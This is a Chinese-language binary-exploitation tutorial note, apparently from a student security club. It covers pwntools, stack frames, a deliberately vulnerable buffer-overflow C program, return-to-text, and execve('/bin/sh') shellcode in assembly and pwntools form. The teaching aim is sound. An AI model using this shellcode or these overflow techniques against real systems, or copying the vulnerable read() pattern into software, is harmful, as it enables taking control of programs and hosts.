---
###### tags: `Hackersir note`
---
# Pwn_1

## Binary Exploitation
利用一支 Binary 的漏洞 (Vulnerability) 來達到控制程式的流程 (Control Flow)，目的在於獲得程式的控制權，又稱**Pwn**
![](https://i.imgur.com/88V6oaQ.png)

## Tools
* objdump
    把machine code丟到assembler然後跑出assembly
    ```bash=
    $ objdump -d -M intel <file> | less
    ```
    ``-M intel``:輸出intel format
    
* readelf
    ```bash=
    $ readelf -a bof
    ```
    可看header
* IDA Pro
* GDB-PEDA
* Pwntools
    * p64(int) 0xfaceb00c => ‘\x0c\xb0\xce\xfa\x00\x00\x00\x00’
    * u64(str) ‘\x0c\xb0\xce\xfa\x00\x00\x00\x00’ => 0xfaceb00c
    * p32(int) 0xfaceb00c => ‘\x0c\xb0\xce\xfa’
    * u32(str) ‘\x0c\xb0\xce\xfa’ => 0xfaceb00c
    * remote(host, port) / process(path)
    * .recv(int) 7 => Hello world! => ‘Hello w’
    * .recvuntil(str) ‘or’ => Hello world! => ‘Hello wor’
    * .recvline() === .recvuntil(‘\n’)
    * .send(str) ‘payload’ => ‘payload’
    * .sendline(str) ‘payload’ => ‘payload\n’
    * .interactive()
## Binary Format
知己知彼 百shell百get
* ELF
    * rodata(read-only data)
    * data 
    * code
    * stack
    * heap 
    ![](https://i.imgur.com/DPHg0ga.png)

## x64 Calling Convention
* rdi, rsi, rdx, rcx, r8, r9, (push to stack)
* rdi, rsi, rdx, r10, r8, r9, (push to stack) for system call
* return value is stored in rax

## Stack Frame

### Function Prologue
* 在main call function address 時，stack 裡會push main 的下一個address，同時rip更改成function address，rsp往上移一個位置。
* 進到function第一個指令是``push rbp``，所以push rbp的address，rsp往上移一個位置，rip更改下一個指令的位置。
* 第二個指令是``mov rbp, rsp``，所以把rbp移到rsp的位置，rip更改下一個指令的位置。
* 假設下一個指令是``sub rsp, 0x10``，這句是function裡要開多少變數的空間，所以rsp會往上移動兩個位置(一個位置為8bytes)，rip更改下一個指令的位置。
* 之後執行function裡的code。
### Function Epilogue
* 結束執行function code後，會有兩個指令要做，第一為``leave``，我們可以把``leave``拆成兩個指令來分析:
    * 第一個``mov rsp, rbp``，把rsp移到rbp的位置，也代表這function裡的變數生命週期結束。
    * 第二個``pop rbp``，所以rbp會移動到剛剛裡面存的address，然後rsp會因為pop而往下移動一個位置，rip指到下一個指令``ret``的address。
* 最後一個是``ret``也就是return，動作就只有``pop rsp``，把rip更改成剛剛pop的值，rsp往下移動一個位置。

## Buffer Overflow
假設有一程式
```cpp=
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main()
{
char buf[0x10];
read(0, buf, 0x30);
return 0;
}
```
我們從code得知有一變數buf儲存的空間有0x10 bytes，而下面``read(0, buf, 0x30);``是可以寫入buf 0x30 bytes 的data。
:::info
思路：從上面的stack frame得知，我們每一個指令都需要rsp，rip來指揮cpu執行指令，而這些address也是存在stack裡，如果我們修改stack裡的address我們就可以間接控制CPU了
:::

* 所以我們輸入0x10 個 'a'，stack 裡原本開的儲存格裡會佔滿'a'，不會影響到rbp裡的值跟return address。
* 那我們輸入0x20 個 'a'，畢竟我們可以輸入0x30 個資料，可以察覺stack rbp裡的值跟return address 都被修改成'a'了，而根據上面的Epilogue，程式會直接crash掉。

## Return to Text
pwn裡最基本的手法，利用我們剛剛的Buffer Overflow原理，進行攻擊。
上面我們輸入了0x20 個 'a'，所以她的rip跟return address會被更改成'a'，那如果裡面有一function我們想要執行而我們也知道他的address，那我們484可以輸入0x18 個 'a' 加上那個function 的 address，這樣覆蓋時會剛好把address cover上rip 的value，然後等執行時就會跳到function了。

參考資料：[緩衝區溢位攻擊之一(Buffer Overflow)](https://medium.com/@ktecv2000/%E7%B7%A9%E8%A1%9D%E5%8D%80%E6%BA%A2%E4%BD%8D%E6%94%BB%E6%93%8A%E4%B9%8B%E4%B8%80-buffer-overflow-83516aa80240)

## Return to Shellcode
若有一塊可寫可執行又已知地址的 memory，我們就可以預先寫好想要執行的shellcode ，然後再覆蓋 return address跳上去執行。
```
int execve(const char *filename,char *const argv[],char *const envp[]);
```
``execve`` = rax = 0x3b
``const char *filename`` = rdi = address of “/bin/sh”
``char *const argv[]`` = rsi = 0x0
``char *const envp[]`` = rdx = 0x0

需要把stack每一個值設定完成，這樣後面syscall才會開啟shell

```basic=
mov rbx, 0x68732f6e69622f  'h s / n i b /'
push rbx
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 0x3b
syscall
```
撰寫payload(手刻 shell code)
```python=
context.arch = 'amd64'

sc = asm(```
mov rbx, 0x68732f6e69622f
push rbx
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 0x3b
syscall
```)
```
或是你跟我一樣懶，用pwntool的內建function
```python=
context.arch = 'amd64'

sc = asm(shellcraft.sh())
```

參考資料：[Linux System Call Table for x86 64](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)